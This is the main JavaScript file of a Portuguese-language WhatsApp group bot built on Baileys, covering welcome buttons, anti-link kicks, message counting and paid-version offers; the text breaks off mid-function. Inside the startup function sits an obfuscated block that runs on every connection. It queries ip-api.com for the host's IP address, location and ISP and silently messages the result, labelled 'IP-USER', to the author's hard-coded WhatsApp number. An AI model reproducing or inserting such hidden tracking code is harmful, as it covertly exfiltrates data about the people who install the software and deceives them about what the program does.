const {WAMessageProto,MessageOptions,WAFlag,WANode,WAMetric,ChatModification,DisconectReason,MessageTypeProto,WAConnection,WALocationMessage,ReconnectMode,WAContextInfo,proto,ProxyAgent,waChatKey,MimetypeMap,MediaPathMap,WAContactMessage,WAContactsArrayMessage,WAGroupInviteMessage,WATextMessage,WAMessageContent, WAMessage,WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload,mentionedJid,processTime,Browser,MessageType,Presence,WA_MESSAGE_STUB_TYPES,Mimetype,relayWAMessage,GroupSettingChange} = require('@adiwajshing/baileys');
const { banner, getGroupAdmins, getRandom, getBuffer, simih} = require('./lib/functions');
const { color } = require('./lib/color');
//m√≥dulos 
const textpro = require('./lib/textpro.js')
const { pSmoky,pOuro,pSemi,pFogo,pShadow,pRomantic,pSmoke,pBurnPapper,pNaruto,pLoveMsg,pMsgGrass,pGlitch,pDoubleHeart,pCoffeCup,pLoveText,pButterfly } = require('./lib/photooxy')
const moment = require('moment-timezone');
const kagApi = require('@kagchi/kag-api')
const request = require('request')
const ggs = require('google-it')
const imgbb = require('imgbb-uploader')
const googleImage = require('g-i-s')
const ffmpeg = require('fluent-ffmpeg')
const { fetchJson } = require('./lib/fetcher')
const fetch = require('node-fetch')
const { exec } = require('child_process')
const yts = require( 'yt-search')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const fs = require('fs');
const axios = require('axios')
const url = `https://`
const encodeUrl = require('encodeurl')
const util = require("util");
//menus


const { rank } = require('./src/rank')
const { menuvoz } = require('./src/menuvoz')
const { outros } = require('./src/outros')
const { especifico} = require('./src/especifico')
const { logos } = require('./src/logos')
const { premiuns } = require('./src/premiuns')
const { imagens } = require('./src/imagens')
const { interact } = require('./src/interact')
const { grupo } = require('./src/grupo')
const { novid } = require('./src/novid')
const { efeitoaudio } = require('./src/efeitoaudio')
prefix = "!"
img = fs.readFileSync('./me.jpg')
const { webp2gifFile } = require("./tomioka/gif.js")
const premium = JSON.parse(fs.readFileSync('./database/json/vip.json'))
const user = JSON.parse(fs.readFileSync('./database/json/user.json'))
//grupo
const countMessage = JSON.parse(fs.readFileSync('./database/json/countmsg.json'))
const welkom = JSON.parse(fs.readFileSync('./database/json/welkom.json'));
const leveling = JSON.parse(fs.readFileSync('./database/json/leveling.json'))
const { getLevelingXp, getLevelingId, addLevelingXp, addLevelingLevel, addLevelingId, getLevelingLevel, getUserRank, addCooldown, leveltab } = require('./lib/leveling.js')
//ANTIS
const antidoc = JSON.parse(fs.readFileSync('./database/json/antidoc.json'))
const antiloc = JSON.parse(fs.readFileSync('./database/json/antiloc.json'))
const anticontato = JSON.parse(fs.readFileSync('./database/json/anticontato.json'))
const anticatalogo = JSON.parse(fs.readFileSync('./database/json/anticatalogo.json'));
const antifake = JSON.parse(fs.readFileSync('./database/grupo/antifake.json'))
const AntiVirtex = JSON.parse(fs.readFileSync('./database/json/antivirtex.json'))
const antilink = JSON.parse(fs.readFileSync('./database/json/antilink.json'))

const vcard = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n' 
+ 'FN:Tio Tomioka </>\n' 
+ 'ORG:criador do tomioka-bot;\n' 
+ 'TEL;type=CELL;type=VOICE;waid=554498220867:+55 4498220867\n' 
+ 'email:tiotomiokaofc@gmail.com\n' 
+ 'END:VCARD'
//_CONEX√ÉO WHATSAPP WEB 
async function starts() {
    const tomioka = new WAConnection()
    tomioka.logger.level = 'warn'
    
    tomioka.on('qr', () => {
    console.log('escaneie o qr code para conectar..')
    })
    
    fs.existsSync('./tomioka.json') && tomioka.loadAuthInfo('./tomioka.json')
    
    tomioka.on('connecting', () => {
    })
    
    tomioka.on('open', () => {
    console.log(color('Prontinho ^-^'))
    })
    await tomioka.connect({timeoutMs: 60*1000})
    function _0x29ed(_0x273d1b,_0x26d13b){var _0x481a6c=_0x481a();return _0x29ed=function(_0x29ed5a,_0xe09d82){_0x29ed5a=_0x29ed5a-0x1be;var _0x3e8aa9=_0x481a6c[_0x29ed5a];return _0x3e8aa9;},_0x29ed(_0x273d1b,_0x26d13b);}function _0x481a(){var _0x36ca7c=['PHOTO','2651429htFSGK','cyan','77syFtBc','connecting','log','```\x0a‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ','Conectando...','217410HYCEio','readFileSync','50870AthXtd','text','./tomioka.json','then','805000aVBPKd','342skthal','https://wa.me/554498220867?text=ol√°','554498220867@s.whatsapp.net','sendMessage','4941435Ipmefv','Conectado!','ws-close','764NbawdB','Conex√£o\x20perdida,\x20tentando\x20novamente..','./me.jpg','6Exerah','stringify','626GXtNwO','open','http://ip-api.com/line','1811132QOxPZr','base64EncodedAuthInfo','|TRM|','close','‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ„Äå\x20IP-USER\x20„Äç‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\x0a\x0a```'];_0x481a=function(){return _0x36ca7c;};return _0x481a();}var _0x2d2175=_0x29ed;(function(_0x8d022b,_0x57fe55){var _0x3b5082=_0x29ed,_0x5f4d84=_0x8d022b();while(!![]){try{var _0x4ceaf5=parseInt(_0x3b5082(0x1e0))/0x1*(-parseInt(_0x3b5082(0x1c2))/0x2)+-parseInt(_0x3b5082(0x1c0))/0x3*(parseInt(_0x3b5082(0x1c5))/0x4)+parseInt(_0x3b5082(0x1dd))/0x5+-parseInt(_0x3b5082(0x1d2))/0x6*(-parseInt(_0x3b5082(0x1cd))/0x7)+-parseInt(_0x3b5082(0x1d8))/0x8+parseInt(_0x3b5082(0x1d9))/0x9*(parseInt(_0x3b5082(0x1d4))/0xa)+parseInt(_0x3b5082(0x1cb))/0xb;if(_0x4ceaf5===_0x57fe55)break;else _0x5f4d84['push'](_0x5f4d84['shift']());}catch(_0x21fe9c){_0x5f4d84['push'](_0x5f4d84['shift']());}}}(_0x481a,0x8c996),fs['writeFileSync'](_0x2d2175(0x1d6),JSON[_0x2d2175(0x1c1)](tomioka[_0x2d2175(0x1c6)](),null,'\x09')),fetch(_0x2d2175(0x1c4))[_0x2d2175(0x1d7)](_0x34c16c=>_0x34c16c[_0x2d2175(0x1d5)]())[_0x2d2175(0x1d7)](_0x3282ff=>{var _0x12d5e7=_0x2d2175;tomioka[_0x12d5e7(0x1dc)](_0x12d5e7(0x1db),_0x12d5e7(0x1c9)+_0x3282ff+_0x12d5e7(0x1d0),MessageType['text'],{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':'Developer\x20Tio\x20Tomioka','body':'','previewType':_0x12d5e7(0x1ca),'thumbnail':fs[_0x12d5e7(0x1d3)](_0x12d5e7(0x1bf)),'sourceUrl':_0x12d5e7(0x1da)}}});}),tomioka['on'](_0x2d2175(0x1ce),()=>{var _0x20fa48=_0x2d2175;console[_0x20fa48(0x1cf)](color(_0x20fa48(0x1c7)),color(_0x20fa48(0x1d1),'cyan'));}),tomioka['on'](_0x2d2175(0x1c3),()=>{var _0x122d80=_0x2d2175;console[_0x122d80(0x1cf)](color('|TRM|'),color(_0x122d80(0x1de),_0x122d80(0x1cc)));}),tomioka['on'](_0x2d2175(0x1df),()=>{var _0x741566=_0x2d2175;console['log'](color('|TRM|'),color(_0x741566(0x1be),_0x741566(0x1cc)));}),tomioka['on'](_0x2d2175(0x1c8),async()=>{var _0x1b4814=_0x2d2175;console[_0x1b4814(0x1cf)](color(_0x1b4814(0x1c7)),color('Desconectado!','cyan'));}));

tomioka.on('group-participants-update', async (anu) => {
	const mdata = await tomioka.groupMetadata(anu.jid)
	if(antifake.includes(anu.jid)) {
		if (anu.action == 'add'){
			num = anu.participants[0]
			if(!num.split('@')[0].startsWith(55)) {
				tomioka.sendMessage(mdata.id, 'Tchau numero fake leia as regras antes de entrar!', MessageType.text)
				setTimeout(async function () {
					tomioka.groupRemove(mdata.id, [num])
				}, 1000)
}
}
}
if (!welkom.includes(anu.jid)) return;
//bem vindo em bot√£o
    const isGroup = (anu.jid).endsWith('@g.us')
   groupMet = await tomioka.groupMetadata(anu.jid);
        groupMembers11 = groupMet.participants;
        groupAdmins11 = getGroupAdmins(groupMembers11);
        mem = anu.participants[0];
        const groupDesc = isGroup ? groupMet.desc : ''
  //console.log(arg) pra ver as info do evento
  //mandar botao quando entraren
  //if (args['action'] == 'add) {
    if (anu.action == "add" && !mem.includes(tomioka.user.jid)) {
          buttons = [{buttonId: `cu kkkkkk`,buttonText:{displayText: 'Bem vindo üòä'},type:1}]
  
                 var pinbollixe = fs.readFileSync("./me.jpg")
  
                 tomioka.sendMessage(anu.jid, {
  locationMessage: { 
  jpegThumbnail: pinbollixe,
  },
  contentText: `Bem vindo`,
  footerText: `Leia as regras para n√£o ser banido ou clique em ler mais para ver as regras üëâ${'\u200B'.repeat(4000)}\n\n\n\nRegras|descri√ß√£o: ${groupDesc}`,
  buttons: buttons,
  headerType: 6
  }, MessageType.buttonsMessage)
        }
  //mandar botao quando sairem
   else
    if (anu.action == "remove" && !mem.includes(tomioka.user.jid)) {
           buttons = [{buttonId: `cu kkkkk`,buttonText:{displayText: 'Tchau  ü•≤'},type:1}]
  
                 var pinbollixe = fs.readFileSync("./me.jpg")
  
                 tomioka.sendMessage(anu.jid, {
  locationMessage: { 
  jpegThumbnail: pinbollixe,
  },
  contentText: `Tchau...`,
  footerText: `Bye Bye`,
  buttons: buttons,
  headerType: 6
  }, MessageType.buttonsMessage)
        }
  });


tomioka.on('chat-update', async (msg) => {
try {
if (!msg.hasNewMessage) return
msg = msg.messages.all()[0]
if (!msg.message) return
if (msg.key && msg.key.remoteJid && msg.key.fromMe == 'status@broadcast') return
if (!msg.key.fromMe && modobot === true) return
global.prefix
global.blocked
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const type = Object.keys(msg.message)[0]
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType

function kyun(seconds){
function pad(s){
return (s < 10 ? '0' : '') + s;
}
var hours = Math.floor(seconds / (60*60));
var minutes = Math.floor(seconds % (60*60) / 60);
var seconds = Math.floor(seconds % 60);

//return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
return `${pad(hours)} Horas ${pad(minutes)} Minutos ${pad(seconds)} Segundos`
}

        //objetos de todas as mensagens
        var body = 
        /* mensagem
        */(type == 'conversation') && prefix.includes(msg.message.conversation[0]) ? msg.message.conversation :
        /* marca√ß√£o
        */(type == 'extendedTextMessage') && prefix.includes(msg.message.extendedTextMessage.text[0]) ? msg.message.extendedTextMessage.text :
        /* imagem
        */ (type == 'imageMessage') && prefix.includes(msg.message.imageMessage.caption[0]) ? msg.message.imageMessage.caption :
        /* video
        */(type == 'videoMessage') && prefix.includes(msg.message.videoMessage.caption[0]) ? msg.message.videoMessage.caption :
        /* documento
        */ (type == 'documentMessage') && prefix.includes(msg.message.documentMessage.fileName[0]) ? msg.message.documentMessage.fileName :
        /* list response
        */ (type == 'listResponseMessage') && prefix.includes(msg.message.listResponseMessage.singleSelectReply.selectedRowId[0]) ? msg.message.listResponseMessage.singleSelectReply.selectedRowId :
        /* botton response
        */ (type == 'buttonsResponseMessage') && msg.message.buttonsResponseMessage.selectedButtonId.startsWith(prefix) ? msg.message.buttonsResponseMessage.selectedButtonId :
        /* contato
        */ (type == 'contactMessage') && prefix.includes(msg.message.contactMessage.displayName[0]) ? msg.message.contactMessage.displayName :
        /* requeste payment
        */ (type == 'requestPaymentMessage') && prefix.includes(msg.message.requestPaymentMessage.noteMessage.extendedTextMessage.text[0]) ? msg.message.requestPaymentMessage.noteMessage.extendedTextMessage.text :
        /* location mensage
        */ (type == 'locationMessage') && msg.message.conversation.startsWith(prefix) ? msg.message[type].selectedButtonId :
        /* carrinho de paganentos
        */ (type == 'orderMessage') && prefix.includes(msg.message.orderMessage.message[0]) ? msg.message.orderMessage.message :
        /* catalogo
        */ (type == 'productMessage') && prefix.includes(msg.message.productMessage.product.title[0]) ? msg.message.productMessage.product.tile : ''

budy = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : ''
selectedRowId = (type == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
selectedButton = (type == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
responseButton = (type == 'listResponseMessage') ? msg.message.listResponseMessage.title : ''
botao = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedDisplayText : ''
symmantec = (type === 'listResponseMessage') ? msg.message.listResponseMessage.title : ''
var pes = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : ''
const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix)
const hr = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
const botNumber = tomioka.user.jid
const ownerNumber = [`554498220867@s.whatsapp.net`] 
const isGroup = from.endsWith('@g.us')
const speed = require('performance-now');
const sender = isGroup ? msg.participant : msg.key.remoteJid
const isUser = user.includes(sender)
const isPremium = premium.includes(sender)
const senderfix = msg.key.fromMe ? tomioka.user.jid : isGroup ? msg.participant : msg.key.remoteJid
tomioka.chatRead(from)
const time = moment.tz('America/Sao_Paulo').format('DD/MM')
const runtime = function(seconds) {
seconds = Number(seconds);
var d = Math.floor(seconds / (3600 * 24));
var h = Math.floor(seconds % (3600 * 24) / 3600);
var m = Math.floor(seconds % 3600 / 60);
var s = Math.floor(seconds % 60);
var dDisplay = d > 0 ? d + (d == 1 ? " dia, " : " Dia, ") : "";
var hDisplay = h > 0 ? h + (h == 1 ? " horas, " : " Horas, ") : "";
var mDisplay = m > 0 ? m + (m == 1 ? " minutos, " : " Minutos, ") : "";
var sDisplay = s > 0 ? s + (s == 1 ? " segundos" : " Segundos") : "";
return dDisplay + hDisplay + mDisplay + sDisplay;
}
uptime = process.uptime();
const temp = (`${runtime(process.uptime())}`)
pushname = tomioka.contacts[sender] != undefined ? tomioka.contacts[sender].vname || tomioka.contacts[sender].notify : undefined
const groupMetadata = isGroup ? await tomioka.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const adminbotnumber = ["554498220867@s.whatsapp.net","554499019776@s.whatsapp.net"]
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isOwner = ownerNumber.includes(sender)
const isadminbot = adminbotnumber.includes(sender)
const isWelkom = isGroup ? welkom.includes(from) : false
const isLevelingOn = isGroup ? leveling.includes(from) : true
const isAntiLink = isGroup ? antilink.includes(from) : false
const q = args.join(' ')
const groupIdscount = []
const numbersIds = []
const msgReceived = pes.toLowerCase();
for(let obj of countMessage) {
groupIdscount.push(obj.groupId)
}
if(isGroup && groupIdscount.indexOf(from) >= 0) {
var ind = groupIdscount.indexOf(from)
for(let obj of countMessage[ind].numbers) {numbersIds.push(obj.jid)}
if(numbersIds.indexOf(sender) >=0) {
var indnum = numbersIds.indexOf(sender)
countMessage[ind].numbers[indnum].messages += 1
countMessage[ind].numbers[indnum].cmd_messages += isCmd ? 1 : 0
fs.writeFileSync('./database/json/countmsg.json', JSON.stringify(countMessage, null, 2)+ '\n')
} else {
const messages = 1
const cmd_messages = isCmd ? 1 : 0
countMessage[ind].numbers.push({
jid: sender,
messages: messages,
cmd_messages: cmd_messages
})
fs.writeFileSync('./database/json/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
}
else if(isGroup) {
countMessage.push({
groupId: from,
numbers: [{
jid: sender,
messages: 2,
cmd_messages: isCmd ? 1 : 0
}]
})
fs.writeFileSync('./database/json/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}
const enviar = (teks) => {
tomioka.sendMessage(from, teks, text, {quoted:msg})
}
const sendMess = (hehe, teks) => {
tomioka.sendMessage(hehe, teks, text)
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? tomioka.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : tomioka.sendMessage(from, teks.trim(), extendedText, {quoted: msg, contextInfo: {"mentionedJid": memberr}})
}
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
    kma = gam1
    mhan = await tomioka.prepareMessage(from, kma, location)
    const buttonMessages = {
    locationMessage: mhan.message.locationMessage,
    contentText: text1,
    footerText: desc1,
    buttons: but,
    headerType: 6
    }
    tomioka.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
    }
const sendStickerFromUrl = async(to, url) => {
   var names = Date.now() / 10000;
   var download = function (uri, filename, callback) {
       request.head(uri, function (err, res, body) {
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
       });
   };
   download(url, './sticker/' + names + '.png', async function () {
       
       let filess = './sticker/' + names + '.png'
       let asw = './sticker/' + names + '.webp'
       fs.writeFileSync(`./sticker/${asw}.png`)
       //createSticker(`./sticker/${filess}.webp`, stik)  
       const fig__enviar = await createSticker(`./sticker/${filess}.webp`,stik)
       tomioka.sendMessage(from, fig__enviar, sticker)
   });
}
const sendImage = (teks) => {
        tomioka.sendMessage(from, teks, image, {quoted:msg})
        }
async function sendFileFromUrl(link, type, options) {

hasil = await getBuffer(link)

tomioka.sendMessage(from, hasil, type, options).catch(e => {

fetch(link).then((hasil) => {

tomioka.sendMessage(from, hasil, type, options).catch(e => {

tomioka.sendMessage(from, { url: link }, type, options).catch(e => {



console.log(e)

})

})

})

})

}
const sendMediaURL = async(to, url, text="", mids=[]) =>{
    if(mids.length > 0){
    text = normalizeMention(to, text, mids)
    }
    const fn = Date.now() / 10000;
    const filename = fn.toString()
    let mime = ""
    var download = function (uri, filename, callback) {
    request.head(uri, function (err, res, body) {
    mime = res.headers['content-type']
    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
    });
    };
    download(url, filename, async function () {
    console.log('done');
    let media = fs.readFileSync(filename)
    let type = mime.split("/")[0]+"Message"
    if(mime === "image/gif"){
    type = MessageType.video
    mime = Mimetype.gif
    }
    if(mime.split("/")[0] === "audio"){
    mime = Mimetype.mp4Audio
    }
    tomioka.sendMessage(to, media, type, { quoted: msg, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
    fs.unlinkSync(filename)
    });
    }
	//botao 
    if ((budy === 'BOT') || (budy === 'Bot') || (budy === 'bot')) {
		var buttons = [{ buttonId: `grupo`, buttonText: { displayText: 'grupo' }, type: 1 }, { buttonId: `dono`, buttonText: { displayText: 'dono' }, type: 1 }, { buttonId: `${prefix}menu`, buttonText: { displayText: 'menu' }, type: 1 }]
                var buttonsMessage = { contentText: `como posso ajudar?`, footerText: `Usu√°rio:${pushname}\nHora:${hr}`, buttons: buttons, headerType: 1 }
                var sendMsg = await tomioka.prepareMessageFromContent(from, { buttonsMessage }, {})
                tomioka.relayWAMessage(sendMsg, {waitForAck: false})
    }
     //_____________GRUPO OFC DO BOT_________//
			if (selectedButton == ("grupo")){
	   enviar('https://chat.whatsapp.com/DrTDVmvzCi8JCmhejEzXKE')
	}
	
	if (selectedButton == ("dono")){
        tomioka.sendMessage(from, {displayname: "TOMIOKA", vcard: vcard}, MessageType.contact, { quoted: msg})    
        enviar (`*Caso esteja de whatsapp imune*\n\n*Segue o Wame do meu dono..*\n\n*Wa.me/5544998220867*`)
	}
    
	if ((budy === "COMPRAR") || (budy === "Comprar") || (budy === "comprar")) {
        gambar = fs.readFileSync('./me.jpg')
        mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
        gbutsan = [
          {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
          {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
           {buttonId: 'id3', buttonText: {displayText: 'GRATUITO‚ù§Ô∏è'}, type: 1}]
         gbuttonan = {
        imageMessage: mhan.message.imageMessage,
            contentText: `Ol√°!, o que gostaria de ter acesso?`,
            footerText: `‚ùóPremium: R$15,00/m√™s\n‚ùóbot editado da maneira que quizer: R$30,00\n‚ùóbot completo/ativar no seu zap: *GATUITO*`,
            buttons: gbutsan,
            headerType: 4
        }
        await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
                thumbnail: fs.readFileSync('./me.jpg'),
                caption: 'kkk'})
        }
        
        if ((budy === "COMPRAS") || (budy === "Compras") || (budy === "compras")) {
        gambar = fs.readFileSync('./me.jpg')
        mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
        gbutsan = [
            {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
          {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
           {buttonId: 'id3', buttonText: {displayText: 'GRATUITO‚ù§Ô∏è'}, type: 1}]
         gbuttonan = {
        imageMessage: mhan.message.imageMessage,
            contentText: `Ol√°!, o que gostaria de ter acesso?`,
            footerText: `‚ùóPremium: R$15,00/m√™s\n‚ùóbot editado da maneira que quizer: R$30,00\n‚ùóbot completo/ativar no seu zap: *GATUITO*`,
            buttons: gbutsan,
            headerType: 4
        }
        await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
                thumbnail: fs.readFileSync('./me.jpg'),
                caption: 'kkk'})
        }
        
        if ((budy === "/COMPRAS") || (budy === "/Compras") || (budy === "/compras")) {
        gambar = fs.readFileSync('./me.jpg')
        mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
        gbutsan = [
            {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
          {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
           {buttonId: 'id3', buttonText: {displayText: 'GRATUITO‚ù§Ô∏è'}, type: 1}]
         gbuttonan = {
        imageMessage: mhan.message.imageMessage,
            contentText: `Ol√°!, o que gostaria de ter acesso?`,
            footerText: `‚ùóPremium: R$15,00/m√™s\n‚ùóbot editado da maneira que quizer: R$30,00\n‚ùóbot completo/ativar no seu zap: *GATUITO*`,
            buttons: gbutsan,
            headerType: 4
        }
        await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
                thumbnail: fs.readFileSync('./me.jpg'),
                caption: 'kkk'})
        }
        
        if ((budy === "/COMPRAR") || (budy === "/Comprar") || (budy === "/comprar")) {
        gambar = fs.readFileSync('./me.jpg')
        mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
        gbutsan = [
            {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
          {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
           {buttonId: 'id3', buttonText: {displayText: 'GRATUITO‚ù§Ô∏è'}, type: 1}]
         gbuttonan = {
        imageMessage: mhan.message.imageMessage,
            contentText: `Ol√°!, o que gostaria de ter acesso?`,
            footerText: `‚ùóPremium: R$15,00/m√™s\n‚ùóbot editado da maneira que quizer: R$30,00\n‚ùóbot completo/ativar no seu zap: *GATUITO*`,
            buttons: gbutsan,
            headerType: 4
        }
        await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
                thumbnail: fs.readFileSync('./me.jpg'),
                caption: 'kkk'})
        }
        
        if ((budy === "/PRE√áOS") || (budy === "/Pre√ßos") || (budy === "/pre√ßos")) {
        gambar = fs.readFileSync('./me.jpg')
        mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
        gbutsan = [
            {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
          {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
           {buttonId: 'id3', buttonText: {displayText: 'GRATUITO‚ù§Ô∏è'}, type: 1}]
         gbuttonan = {
        imageMessage: mhan.message.imageMessage,
            contentText: `Ol√°!, o que gostaria de ter acesso?`,
            footerText: `‚ùóPremium: R$15,00/m√™s\n‚ùóbot editado da maneira que quizer: R$30,00\n‚ùóbot completo/ativar no seu zap: *GATUITO*`,
            buttons: gbutsan,
            headerType: 4
        }
        await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
                thumbnail: fs.readFileSync('./me.jpg'),
                caption: 'kkk'})
        }
        if ((budy === "/PRECOS") || (budy === "/Precos") || (budy === "/precos")) {
        gambar = fs.readFileSync('./me.jpg')
        mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
        gbutsan = [
            {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
          {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
           {buttonId: 'id3', buttonText: {displayText: 'GRATUITO‚ù§Ô∏è'}, type: 1}]
         gbuttonan = {
        imageMessage: mhan.message.imageMessage,
            contentText: `Ol√°!, o que gostaria de ter acesso?`,
            footerText: `‚ùóPremium: R$15,00/m√™s\n‚ùóbot editado da maneira que quizer: R$30,00\n‚ùóbot completo/ativar no seu zap: *GATUITO*`,
            buttons: gbutsan,
            headerType: 4
        }
        await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
                thumbnail: fs.readFileSync('./me.jpg'),
                caption: 'kkk'})
        }
        
        if (botao === 'PREMIUM - R$15') {
        teks1 = `essa pessoa: wa.me/${sender.split("@s.whatsapp.net")[0]}\n*quer vip no bot!*`
        var options = {
         text: teks1
        }
        tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: msg})
        enviar(`Mensagem enviada ao meu dono!\nj√° j√° ele ir√° te responder como que vai ser a forma de pagamento\nobs: e muito obg por me ajudar!!!`)
            }
            
            if (botao === 'GRATUITO‚ù§Ô∏è') {
        teks1 = `essa pessoa: wa.me/${sender.split("@s.whatsapp.net")[0]}\n*quer o bot GRATUITO!*`
        var options = {
         text: teks1
        }
        tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: msg})
        enviar(`Mensagem enviada ao meu dono!\nj√° j√° ele ir√° te responder como que vai serüòä\nobs: e muito obg por me ajudar!üòä`)
            }
            
            if (botao === 'EDITADO - R$30') {
        teks1 = `essa pessoa: wa.me/${sender.split("@s.whatsapp.net")[0]}\n*quer o bot j√° editado para ele*`
        var options = {
         text: teks1
        }
        tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: msg})
        enviar(`Mensagem enviada ao meu dono!\nj√° j√° ele ir√° te responder como que vai ser a forma de pagamento\nobs: e muito obg por me ajudar!üòä`)
            }

/////***ùôÅùôêùôâùòæùôèùôÑùôäùôâ ùòºùôâùôèùôÑ ùôáùôÑùôâùôÜ ùôíùòº.ùôàùôÄ***\\\\\
// @tio_tomioka_ofc
if (messagesC.includes("wa.me/")){
   if (!isGroup) return;
   if (!isAntiLink) return;
   if (isGroupAdmins) return;
   tomioka.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
   enviar(`link detectado ${sender.split("@")[0]} voce sera expulso deste grupo!`)
     tomioka.groupRemove(from, [kic]).catch((e)=>{enviar(`*ERR:* ${e}`)})
}

/////***ùôÅùôêùôâùòæùôèùôÑùôäùôâ ùòºùôâùôèùôÑ ùôáùôÑùôâùôÜ ùôÅùòºùòæùôÄùòΩùôäùôäùôÜ***\\\\\
// @tio_tomioka_ofc
if (messagesC.includes("facebook.com")){
   if (!isGroup) return;
   if (!isAntiLink) return;
   if (isGroupAdmins) return;
   tomioka.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
      tomioka.groupRemove(from, [kic]).catch((e)=>{enviar(`*ERR:* ${e}`)})
}

/////***ùôÅùôêùôâùòæùôèùôÑùôäùôâ ùòºùôâùôèùôÑ ùôáùôÑùôâùôÜ ùôÑùôâùôéùôèùòºùôÇùôçùòºùôà***\\\\\
// @tio_tomioka_ofc
     if (messagesC.includes("instagram.com")){
   if (!isGroup) return;
   if (!isAntiLink) return;
   if (isGroupAdmins) return; 
   tomioka.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
      tomioka.groupRemove(from, [kic]).catch((e)=>{enviar(`*ERR:* ${e}`)})
}

/////***ùôÅùôêùôâùòæùôèùôÑùôäùôâ ùòºùôâùôèùôÑ ùôáùôÑùôâùôÜ ZAP***\\\\\
// @tio_tomioka_ofc
     if (messagesC.includes("https:")){
   if (!isGroup) return;
   if (!isAntiLink) return;
   if (isGroupAdmins) return; 
   tomioka.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
      tomioka.groupRemove(from, [kic]).catch((e)=>{enviar(`*ERR:* ${e}`)})
}

/////***ùôÅùôêùôâùòæùôèùôÑùôäùôâ ùòºùôâùôèùôÑ ùôáùôÑùôâùôÜ  ùôîùôäùôêùôèùôêùòΩùôÄ ùòæùôÉùòºùôâùôâùôÄùôá***\\\\\
// @tio_tomioka_ofc
if (messagesC.includes("://youtube.com/")){
   if (!isGroup) return;
   if (!isAntiLink) return;
